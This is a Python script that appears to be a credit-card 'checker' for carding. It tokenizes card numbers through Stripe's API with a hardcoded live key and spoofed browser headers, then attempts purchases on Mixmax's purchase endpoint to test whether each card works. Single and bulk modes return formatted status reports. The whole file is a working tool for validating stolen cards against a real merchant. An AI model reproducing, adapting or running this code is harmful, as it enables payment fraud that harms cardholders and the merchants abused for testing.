import re, requests, string, json
import time
import random
import os

SK = os.getenv('SK')
s = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'

def get_token(card):
  ccn, mm, yy, cvv = card.split('|',4)
  b = requests.get('https://ip.seeip.org/').text

  s = requests.post('https://m.stripe.com/6')
  r = s.json()
  Guid = r['guid']
  Muid = r['muid']
  Sid = r['sid']

        # hmm
  load = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv,
           'card[name]': 'jose lopez',
        'payment_user_agent': 'stripe.js/f0346bf10; stripe-js-v3/f0346bf10',
        'time_on_page': '59424',
        'key': 'pk_live_BssIav0BSd7QyAEoguHrrr0U',
        'pasted_fields': 'number'
        }

  header = {
            'authority': 'api.stripe.com',
        'method': 'POST',
        'path': '/v1/tokens',
        'scheme': 'https',
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'es-419,es;q=0.9',
        'content-length': '391',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',

        }

  r =  requests.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header)
  return r.text

def charge_tok(token):  
  headers = {
        'authority': 'app.mixmax.com',
        'method': 'POST',
        'path': '/api/purchases',
        'scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'es-419,es;q=0.9',
        'content-length': '712',
        'content-type': 'application/json',
        'cookie': 'initialMixmaxURL=https%3A%2F%2Fwww.mixmax.com%2F; initialExternalReferrerURL=; lastMixmaxURL=https%3A%2F%2Fwww.mixmax.com%2F; lastExternalReferrerURL=; __stripe_mid=ac1942e0-6930-4798-9f74-9ad43d9fdc35eb2748; __stripe_sid=65a4b2e2-bc25-4b3a-9fe6-c22a6f02a62dd7cf54',
        'origin': 'https://app.mixmax.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        }

  postdata = {"token":{"id":token,"object":"token","card":{"id":"card_1LJm9JDGECUvy6xjFGS6oBRq","object":"card","address_city":"","address_country":"","address_line1":"","address_line1_check":"","address_line2":"","address_state":"","address_zip":"","address_zip_check":"","brand":"Visa","country":"US","cvc_check":"unchecked","dynamic_last4":"","exp_month":"10","exp_year":"2025","funding":"debit","last4":"7117","name":"jose lopez","tokenization_method":""},"client_ip":"187.187.227.236","created":"1657405757","livemode":"true","type":"card","used":"false"},"name":"jose lopez","email":Email,"featureName":"mixmaxPremiumAnnualOct2017","coupon":"","location":"homepage - pricing"}

  r = requests.post('https://app.mixmax.com/api/purchases', headers= headers, json = postdata)
  return r.text

def check_card(card):
  r1 = get_token(card)
  
  res1 = json.loads(r1)
  if 'error' in r1:
    msg = res1['error']['message']
  else:
    token = res1['id']
    r2 = charge_tok(token) 
    #res2 = json.loads(r2)
    res3 = r2.split('"')
    print(res3)
    if 'Rate limit exceeded' in r2:
     msg = 'Rate limit exceeded'
    else:
     msg = res3[3]
    print(msg)
  return msg
  
def single_check(input):
  if len(input) == 0:
      return ("<b>No Card to cv</b>")
  
  x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  if x:
    card = x.group(0)
  time1 = time.time() 
  msg = check_card(card)
  time2 = time.time()
  return (f'''
<b>CC</b>➟ <code>{card}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}

================================================================

<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================
''')

def massv_check(input):
  input = re.sub('[a-zA-Z]', '', str(input))
  #list = input.replace('/','').split('\n')
  list = re.findall(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  print(list)
  if list == "":
    return f"""<b>➡️MASS STRIPE 
----------------------------------------------
Status: CC Not Found!!❌
----------------------------------------------</b>
  """
  start=time.time()
  result = ""
  for i in range(len(list)):
    card = list[i]
    msg = check_card(card)
    ok = f'''CC: <code>{card}</code>
Response: {msg}
----------------------------------------------\n'''
    result += ok
  end=time.time()
  tm=f'{round((end-start),2)}s'
  print(result)
  return f"""<b>➡️MASS STRIPE 
----------------------------------------------
Status: Success!!! ✅
Checked: {len(list)} CCs
----------------------------------------------
{result}Time Taken: {tm}
----------------------------------------------</b>"""